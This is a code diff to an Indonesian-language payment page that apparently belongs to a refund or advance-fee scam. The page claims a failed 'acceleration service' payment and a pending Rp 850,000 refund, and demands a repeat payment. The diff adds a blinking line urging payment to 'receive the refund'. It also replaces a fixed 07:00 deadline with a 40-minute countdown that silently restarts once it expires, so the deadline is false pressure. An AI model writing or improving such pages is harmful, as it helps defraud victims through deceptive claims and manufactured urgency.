@@ -185,6 +185,21 @@
             color: #d32f2f;
         }
         
+        .blinking-text {
+            text-align: center;
+            font-size: 16px;
+            font-weight: bold;
+            color: #d32f2f;
+            margin: 15px 0;
+            animation: blink 1.5s infinite;
+        }
+        
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+        
         .btn-container {
             display: flex;
             justify-content: center;
@@ -262,6 +277,10 @@
                 min-width: 180px;
             }
             
+            .blinking-text {
+                font-size: 14px;
+            }
+            
             .btn-container {
                 flex-direction: column;
             }
@@ -289,6 +308,10 @@
             
             <div style="text-align: center; margin-bottom: 20px; font-size: 16px; color: #555;">
                 Pembayaran layanan percepatan Anda gagal. Saldo akan dikembalikan sebesar Rp 850.000 ke dalam nomor rekening pembayaran dalam waktu 8 jam.
+            </div>
+            
+            <div class="blinking-text">
+                Kode Anda Dipulihkan. Lakukan Pembayaran Agar Dapat Segera Menerima Pengembalian Dana.
             </div>
             
             <div class="info-section">
@@ -323,11 +346,11 @@
             <div class="timer-container">
                 <div class="timer-label">Batas Waktu Pembayaran Ulang</div>
                 <div class="timer" id="countdown">--:--:--</div>
-                <div style="font-size: 14px; color: #555; margin-top: 5px;">Sebelum pukul 07:00 WIB</div>
+                <div style="font-size: 14px; color: #555; margin-top: 5px;">40 menit tersisa</div>
             </div>
             
             <div class="warning">
-                <strong>Perhatian:</strong> Silahkan lakukan pembayaran ulang sebelum pukul 07:00 WIB atau permohonan Anda akan ditolak otomatis oleh sistem.
+                <strong>Perhatian:</strong> Silahkan lakukan pembayaran ulang sebelum batas waktu yang ditentukan atau permohonan Anda akan ditolak otomatis oleh sistem.
             </div>
             
             <div class="critical-warning">
@@ -346,37 +369,41 @@
     </div>
 
     <script>
-        // Fungsi untuk menghitung waktu tersisa sampai pukul 07:00 WIB
-        function getTimeUntil7AM() {
-            const now = new Date();
-            
-            // Set waktu target ke pukul 07:00 WIB hari ini
-            let target = new Date();
-            target.setHours(7, 0, 0, 0);
-            
-            // Jika waktu sekarang sudah melewati 07:00 WIB hari ini, set target ke 07:00 WIB besok
-            if (now > target) {
-                target.setDate(target.getDate() + 1);
-            }
-            
-            // Hitung selisih waktu dalam milidetik
-            const diff = target - now;
-            
-            // Konversi ke detik
-            const seconds = Math.floor(diff / 1000);
-            
-            return seconds;
-        }
+        // Set waktu awal (40 menit dalam detik)
+        const initialTime = 40 * 60;
         
         // Cek apakah ada waktu tersisa di localStorage
         let timeLeft = localStorage.getItem('paymentRetryTimeLeft') 
             ? parseInt(localStorage.getItem('paymentRetryTimeLeft')) 
-            : getTimeUntil7AM();
+            : initialTime;
+        
+        // Jika waktu tersisa kurang dari atau sama dengan 0, set ulang
+        if (timeLeft <= 0) {
+            timeLeft = initialTime;
+        }
         
         // Update tampilan countdown
         function updateCountdown() {
+            const hours = Math.floor(timeLeft / 3600);
+            const minutes = Math.floor((timeLeft % 3600) / 60);
+            const seconds = timeLeft % 60;
+            
+            // Format tampilan waktu
+            const formattedTime = 
+                String(hours).padStart(2, '0') + ':' + 
+                String(minutes).padStart(2, '0') + ':' + 
+                String(seconds).padStart(2, '0');
+            
+            document.getElementById('countdown').textContent = formattedTime;
+            
+            // Simpan waktu tersisa ke localStorage
+            localStorage.setItem('paymentRetryTimeLeft', timeLeft);
+            
+            // Kurangi waktu
+            timeLeft--;
+            
             // Jika waktu habis
-            if (timeLeft <= 0) {
+            if (timeLeft < 0) {
                 clearInterval(timerInterval);
                 document.getElementById('countdown').textContent = "WAKTU HABIS";
                 document.getElementById('countdown').style.color = "#ff0000";
@@ -397,27 +424,7 @@
                         button.style.cursor = "not-allowed";
                     }
                 });
-                
-                return;
             }
-            
-            const hours = Math.floor(timeLeft / 3600);
-            const minutes = Math.floor((timeLeft % 3600) / 60);
-            const seconds = timeLeft % 60;
-            
-            // Format tampilan waktu
-            const formattedTime = 
-                String(hours).padStart(2, '0') + ':' + 
-                String(minutes).padStart(2, '0') + ':' + 
-                String(seconds).padStart(2, '0');
-            
-            document.getElementById('countdown').textContent = formattedTime;
-            
-            // Simpan waktu tersisa ke localStorage
-            localStorage.setItem('paymentRetryTimeLeft', timeLeft);
-            
-            // Kurangi waktu
-            timeLeft--;
         }
         
         // Jalankan countdown setiap detik
